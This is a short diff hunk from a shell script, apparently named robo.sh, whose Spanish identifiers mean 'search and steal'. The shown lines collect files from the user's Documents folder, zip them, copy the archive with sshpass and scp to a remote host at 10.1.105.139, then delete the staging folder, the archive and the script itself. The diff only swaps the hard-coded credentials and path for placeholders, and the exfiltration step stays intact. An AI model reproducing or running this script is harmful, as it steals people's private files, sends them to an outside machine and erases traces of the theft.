@@ -28,7 +28,7 @@ mkdir ~/robasion
 DOC=~/Documents
 buscar_y_robar "$DOC"
 zip -r ~/robo.zip ~/robasion
-sshpass -p 'plicky01' scp ~/robo.zip benqui@10.1.105.139:~/pato
+sshpass -p 'passwd' scp ~/robo.zip user@10.1.105.139:~/target
 rm -r ~/robasion
 rm ~/robo.zip
 rm ~/robo.sh
